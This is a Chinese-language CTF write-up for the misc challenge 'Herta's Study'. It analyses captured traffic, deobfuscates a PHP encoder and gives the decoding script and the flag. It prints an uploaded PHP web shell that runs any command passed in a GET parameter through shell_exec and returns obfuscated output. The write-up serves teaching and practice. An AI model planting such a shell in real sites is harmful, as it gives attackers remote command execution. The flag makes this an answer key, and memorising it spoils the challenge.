# Herta's Study

> 分类：Misc

## 题目描述
考点：PHP 混淆、流量分析。建议配合前两道流量题食用。

## 考察知识点
- 流量分析
- PHP 代码混淆
- create_function / base64_decode / str_rot13

## 解法
第七条流量是上传的 PHP 木马：

```php
<?php
    $payload=$_GET['payload'];
    $payload=shell_exec($payload);
    $bbb=create_function(
        base64_decode('J'.str_rot13('T').'5z'),
        base64_decode('JG5zPWJhc2U2NF9lbmNvZGUoJG5zKTsNCmZvcigkaT0wOyRpPHN0cmxlbigkbnMpOyRp
        Kz0xKXsNCiAgICBpZigkaSUy'.str_rot13('CG0kXKfAPvNtVPNtVPNtWT5mJlEcKG1m').'dHJfcm90MTMoJG5zWyRpXSk7DQo
        gICAgfQ0KfQ0KcmV0dXJuICRuczs==')
    );
    echo $bbb($payload);
?>
```

搜索 `create_function()`，解除混淆后得到加密代码：

```php
$ns = base64_encode($ns);
for ($i = 0; $i < strlen($ns); $i += 1){
    if ($i % 2 == 1) {
        $ns[$i] = str_rot13($ns[$i]);
    }
}
return $ns;
```

就是 Base64 后把奇数位 ROT13。解码反过来就行（第 38 条，`f.txt` 里的是真 flag，另一个是假 flag）：

```php
<?php
$ns = 'ZzxuZ3tmSQNsaGRsUmBsNzVOdKQkZaVZLa0tCt==';
for ($i = 0; $i < strlen($ns); $i += 1){
    if ($i % 2 == 1) {
        $ns[$i] = str_rot13($ns[$i]);
    }
}
echo base64_decode($ns);
// flag{sH3_i4_S0_6eAut1fuL.}
?>
```

## 参考答案
flag{sH3_i4_S0_6eAut1fuL.}

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week2/misc/herta.html
